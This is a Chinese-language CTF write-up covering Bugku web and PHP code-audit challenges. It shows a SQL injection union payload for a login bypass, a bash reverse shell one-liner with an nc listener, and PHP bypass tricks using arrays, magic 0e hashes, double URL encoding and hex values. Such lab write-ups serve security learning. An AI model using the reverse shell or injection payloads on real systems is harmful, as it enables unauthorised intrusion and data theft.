+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615104501313.png" alt="image-20200615104501313"></p>
+<p>可以看到扫到了一个show.php的地址，双击打开后发现flag就在里面</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615104638188.png" alt="image-20200615104638188"></p>
+<p>复制提交就ok</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615104715542.png" alt="image-20200615104715542"></p>
+<h4 id="Bugku-CTF-login2-SKCTF"><a href="#Bugku-CTF-login2-SKCTF" class="headerlink" title="Bugku CTF login2(SKCTF)"></a>Bugku CTF login2(SKCTF)</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615145248163.png" alt="image-20200615145248163"></p>
+<p>查看原始页面</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615145405953.png" alt="image-20200615145405953"></p>
+<p>使用burp抓包发送到repeater模块运行，</p>
+<p>可以看到有一串base64加密</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615145504301.png" alt="image-20200615145504301"></p>
+<p>解密得到以下值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT username,password FROM admin WHERE username&#x3D;&#39;&quot;.$username.&quot;&#39;&quot;;</span><br><span class="line"></span><br><span class="line">if (!empty($row) &amp;&amp; $row[&#39;password&#39;]&#x3D;&#x3D;&#x3D;md5($password))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码中的单双引号的嵌套，其中username和password列名在数据库中是存字符串的，而字符串是需要用引号引起来的，不然会出错，这个时候最外面的双引号是具有解析变量的作用，而里面的单引号是给数据库语句用的，如果里面再用双引号就会跟最外面的双引号起冲突了，故用单引号。</p>
+<p>这告诉我们要登录要满足的条件：查询结果不为空，其次，输入的password的值要等于md5(password)。</p>
+<p>例：<code>username=adminadsadaw&#39; union select 1,md5(1)#&amp;password=1</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615155619788.png" alt="image-20200615155619788"></p>
+<p>这样就能用后台数据库中并不存在的密码来绕过并登录成功：</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615155557851.png" alt="image-20200615155557851"></p>
+<p>下面进入一个命令执行的页面：</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615155646518.png" alt="image-20200615155646518"></p>
+<p>采用的反弹shell来做的。</p>
+<p>反弹shell需要有公网ip，我们假设有个公网ip192.168.10.130，不用公网ip的话就线下赛局域网做题也行。</p>
+<p>输入bash -i &gt;&amp; /dev/tcp/192.168.10.130/8888 0&gt;&amp;1并执行，然后在kali上运行命令：nc -lvp 8888，就能进行连接了，找到flag文件就拿到flag了。<br>原文链接：<a href="https://blog.csdn.net/zz_Caleb/java/article/details/89054600" target="_blank" rel="noopener">https://blog.csdn.net/zz_Caleb/java/article/details/89054600</a></p>
+<h4 id="login3-SKCTF"><a href="#login3-SKCTF" class="headerlink" title="login3(SKCTF)"></a>login3(SKCTF)</h4><p>具体步骤在这个网址：<a href="https://blog.csdn.net/zpy1998zpy/article/details/80667775" target="_blank" rel="noopener">https://blog.csdn.net/zpy1998zpy/article/details/80667775</a></p>
+<h5 id="文件上传2（湖湘杯）"><a href="#文件上传2（湖湘杯）" class="headerlink" title="文件上传2（湖湘杯）"></a>文件上传2（湖湘杯）</h5><h5 id="江湖魔头"><a href="#江湖魔头" class="headerlink" title="江湖魔头"></a>江湖魔头</h5><h5 id="login4"><a href="#login4" class="headerlink" title="login4"></a>login4</h5><h4 id="Web进阶"><a href="#Web进阶" class="headerlink" title="Web进阶"></a>Web进阶</h4><h5 id="phpcmsV9"><a href="#phpcmsV9" class="headerlink" title="phpcmsV9"></a>phpcmsV9</h5><p>打开页面，从字面意思上就可以看出，这是要进行后台扫描。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715172809843.png" alt="image-20200715172809843"></p>
+<p>可能是我卡的原因，页面显示不全，这并无大碍</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715172848323.png" alt="image-20200715172848323"></p>
+<p>使用dirsearch进行目录扫描。</p>
+<p><code>python3 dirsearch -u http://123.206.87.240:8001/ -e php</code></p>
+<p>其中扫描出rebots.txt，其中1.php是返回phpinfo。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715172926781.png" alt="image-20200715172926781"></p>
+<p>在url后打开robots.txt。可以看到flag就在其中</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200715173106341.png" alt="image-20200715173106341"></p>
+<h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><h5 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h5><p>源码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">flag=<span class="string">'xxx'</span>;</span></span><br><span class="line"><span class="meta">extract($</span><span class="bash">_GET); </span></span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">shiyan)) &#123; <span class="variable">$content</span>=trim(file_get_contents(<span class="variable">$flag</span>)); <span class="keyword">if</span>(<span class="variable">$shiyan</span>==<span class="variable">$content</span>) &#123;</span></span><br><span class="line">echo'flag&#123;xxx&#125;';</span><br><span class="line">&#125; </span><br><span class="line">else &#123; </span><br><span class="line">echo'Oh.no';</span><br><span class="line">&#125; </span><br><span class="line">&#125;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>白话代码：<br>一个名叫flag的变量等于‘xxx’<br>将通过GET传过来的数组转为一个名为数组名，值为数组值的变量(如果新的变量和已有变量重名，会将已有变量替换)<br>如果存在一个名叫shiyan的字符串<br>将flag变量的值赋给名为content变量<br>如果变量shiyan和变量content的值相同，<br>就输出flag的值<br>否则就输出Oh,no<br>因为extract()会把符号表中已存在的变量名的值替换掉，所以制造Payload ：?shiyan=&amp;flag=<br>也就是利用新传入的值为空的flag替换原有的flag的值。构造空等于空，成功输出flag的值</p>
+<h5 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h5><p>源码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">flag = <span class="string">"flag&#123;xxxxx&#125;"</span>;</span></span><br><span class="line">if (isset($_GET['a'])) &#123;</span><br><span class="line">if (strcmp($_GET['a'], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="line">//比较两个字符串（区分大小写）</span><br><span class="line">die('Flag: '.$flag);</span><br><span class="line">else</span><br><span class="line">print 'No';</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到注释，如果两者相等返回0，可以使用数组，来将其判断成0</p>
+<p>payload:<code>http://123.206.87.240:9009/6.php?a[]=1</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716084441132.png" alt="image-20200716084441132"></p>
+<h5 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h5><p>源码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi("hackerDJ",$_GET[id])) &#123; echo("not allowed!");</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">$</span><span class="bash">_GET[id] = urldecode(<span class="variable">$_GET</span>[id]);</span></span><br><span class="line"><span class="meta">if($</span><span class="bash">_GET[id] == <span class="string">"hackerDJ"</span>)&#123;</span></span><br><span class="line">echo "Access granted!"; </span><br><span class="line">echo "flag";</span><br><span class="line">&#125;?</span><br><span class="line"><span class="meta">&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到题目就已经给提示了，说了两次url编码，复制hackerDJ，在小葵工具，或者在线工具中进行两次URL编码</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716084821436.png" alt="image-20200716084821436"></p>
+<p>复制提交以下</p>
+<p>payload：<code>http://123.206.87.240:9009/10.php?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716084903971.png" alt="image-20200716084903971"></p>
+<h5 id="MD5-函数"><a href="#MD5-函数" class="headerlink" title="MD5()函数"></a>MD5()函数</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="meta">$</span><span class="bash">flag = <span class="string">'flag&#123;test&#125;'</span>;</span></span><br><span class="line">if (isset($_GET['username']) and isset($_GET['password'])) &#123;</span><br><span class="line">if ($_GET['username'] == $_GET['password'])</span><br><span class="line">print 'Your password can not be your username.';</span><br><span class="line">else if (md5($_GET['username']) === md5($_GET['password']))</span><br><span class="line">die('Flag: '.$flag);</span><br><span class="line">else</span><br><span class="line">print 'Invalid password';</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，其中有这样一条判断，进行md5判断，要username和password全等于。所以这里要是用数组绕过，因为md5不能处理数组</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">else if (md5($_GET['username']) === md5($_GET['password']))</span><br></pre></td></tr></table></figure>
+
+<p>payload:<code>http://123.206.87.240:9009/18.php?username[]=1&amp;password[]=2</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716085249876.png" alt="image-20200716085249876"></p>
+<h5 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a>sha()函数比较绕过</h5><p>源码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">flag = <span class="string">"flag"</span>;</span></span><br><span class="line">if (isset($_GET['name']) and isset($_GET['password']))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">var_dump($</span><span class="bash">_GET[<span class="string">'name'</span>]);</span></span><br><span class="line">echo "</span><br><span class="line">";</span><br><span class="line"><span class="meta">var_dump($</span><span class="bash">_GET[<span class="string">'password'</span>]);</span></span><br><span class="line"><span class="meta">var_dump(sha1($</span><span class="bash">_GET[<span class="string">'name'</span>]));</span></span><br><span class="line"><span class="meta">var_dump(sha1($</span><span class="bash">_GET[<span class="string">'password'</span>]));</span></span><br><span class="line">if ($_GET['name'] == $_GET['password'])</span><br><span class="line">echo '</span><br><span class="line">Your password can not be your name!</span><br><span class="line">';</span><br><span class="line">else if (sha1($_GET['name']) === sha1($_GET['password']))</span><br><span class="line">die('Flag: '.$flag);</span><br><span class="line">else</span><br><span class="line">echo '</span><br><span class="line">Invalid password.</span><br><span class="line">';</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">echo '</span><br><span class="line">Login first!</span><br><span class="line">';</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>打开页面，先构造一下看看页面返回</p>
+<p>如果name和password相同就会返回你的名字不能和密码相同</p>
+<p>并且将用户名和密码进行md5加密</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716140506785.png" alt="image-20200716140506785"></p>
+<p>将用户名和密码输入不同的数字，就会返回密码无效</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716140702144.png" alt="image-20200716140702144"></p>
+<p>审计源码</p>
+<p>发现name和password进行sha()函数比较，并且要求全等于，所以就可以利用数组绕过</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716140834651.png" alt="image-20200716140834651"></p>
+<h5 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">md51 = md5(<span class="string">'QNKCDZO'</span>);</span></span><br><span class="line"><span class="meta">$</span><span class="bash">a = @<span class="variable">$_GET</span>[<span class="string">'a'</span>];</span></span><br><span class="line"><span class="meta">$</span><span class="bash">md52 = @md5(<span class="variable">$a</span>);</span></span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">a))&#123;</span></span><br><span class="line">if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">echo "flag&#123;*&#125;";</span><br><span class="line">&#125; else &#123;</span><br><span class="line">echo "false!!!";</span><br><span class="line">&#125;&#125;</span><br><span class="line">else&#123;echo "please input a";&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>打开页面，让其输入a</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716142456628.png" alt="image-20200716142456628"></p>
+<p>在url中输入a，审计源码发现，不能直接输入QNKCDZO</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716142551180.png" alt="image-20200716142551180"></p>
+<p>输入s878926199a，返回了flag</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716142642496.png" alt="image-20200716142642496"></p>
+<p>原理：</p>
+<p>​        PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。而以下这些字符串，md5哈希之后都是0e开头的</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a	</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure>
+
+<h5 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function noother_says_correct($temp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">	$</span><span class="bash">flag = <span class="string">'flag&#123;test&#125;'</span>;</span></span><br><span class="line"><span class="meta">	$</span><span class="bash">one = ord(<span class="string">'1'</span>); //ord — 返回字符的 ASCII 码值</span></span><br><span class="line"><span class="meta">	$</span><span class="bash">nine = ord(<span class="string">'9'</span>); //ord — 返回字符的 ASCII 码值</span></span><br><span class="line"><span class="meta">	$</span><span class="bash">number = <span class="string">'3735929054'</span>;</span></span><br><span class="line">// Check all the input characters!</span><br><span class="line">	for ($i = 0; $i &lt; strlen($number); $i++)</span><br><span class="line">	&#123;</span><br><span class="line">		// Disallow all the digits!</span><br><span class="line"><span class="meta">		$</span><span class="bash">digit = ord(<span class="variable">$temp</span>&#123;<span class="variable">$i</span>&#125;);</span></span><br><span class="line">		if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">&#123;</span><br><span class="line">// Aha, digit not allowed!</span><br><span class="line">	return "flase";</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">if($</span><span class="bash">number == <span class="variable">$temp</span>)</span></span><br><span class="line">return $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">$</span><span class="bash">temp = <span class="variable">$_GET</span>[<span class="string">'password'</span>];</span></span><br><span class="line">echo noother_says_correct($temp);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">deadc0de</span><br></pre></td></tr></table></figure>
+
+<p>打开页面查看返回，页面返回空白卡</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716144052143.png" alt="image-20200716144052143"></p>
+<p>审计代码，数字不能是1~9，这和3735929054冲突，题目也告诉了用十六进制绕过，将3735929054进行转化，转换成十六进制，前面要加上0x，不然它不知道这个是什么。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716144253333.png" alt="image-20200716144253333"></p>
+<h5 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h5><p>打不开</p>
+<h5 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">flag = <span class="string">"xxx"</span>;</span></span><br><span class="line">if (isset ($_GET['password']))</span><br><span class="line">&#123;</span><br><span class="line">if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)</span><br><span class="line">&#123;</span><br><span class="line">echo '</span><br><span class="line">You password must be alphanumeric</span><br><span class="line">';</span><br><span class="line">&#125;</span><br><span class="line">else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999)</span><br><span class="line">&#123;</span><br><span class="line">if (strpos ($_GET['password'], '-') !== FALSE) //strpos — 查找字符串首次出现的位置</span><br><span class="line">&#123;</span><br><span class="line">die('Flag: ' . $flag);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo('</span><br><span class="line">- have not been found</span><br><span class="line">');</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo '</span><br><span class="line">Invalid password</span><br><span class="line">';</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>代码审计：ereg()函数搜索一个字符串中的指定字符串，成功true，错误false<br> 传入的值必须是数字或大小写字符<br> 传入的值长度小于8，但要大于9999999</p>
+<p>长度和数值矛盾，采用1e8,1x10的8次方，绕过</p>
+<p>在可以看到题目是%00截断绕过，可以构造一下payload查看能否返回</p>
+<p>没有找到* - *。。。将 - 替换为 * - *试试</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716145651772.png" alt="image-20200716145651772"></p>
+<p>这样页面就成功的返回了flag了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716145811973.png" alt="image-20200716145811973"></p>
+<h5 id="strpos数组绕过"><a href="#strpos数组绕过" class="headerlink" title="strpos数组绕过"></a>strpos数组绕过</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">flag = <span class="string">"flag"</span>;</span></span><br><span class="line">if (isset ($_GET['ctf'])) &#123;</span><br><span class="line">if (@ereg ("^[1-9]+$", $_GET['ctf']) === FALSE)</span><br><span class="line">echo '必须输入数字才行';</span><br><span class="line">else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE)</span><br><span class="line">die('Flag: '.$flag);</span><br><span class="line">else</span><br><span class="line">echo '骚年，继续努力吧啊~';</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>代码审计：ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。所以输入的内容不能是正则中的内容。结合题目是数组绕过，所以跟之前的数组绕过一样，这里等号后面可以跟任何内容</p>
+<p>这样进行数组绕过就成功的返回了flag</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716151013505.png" alt="image-20200716151013505"></p>
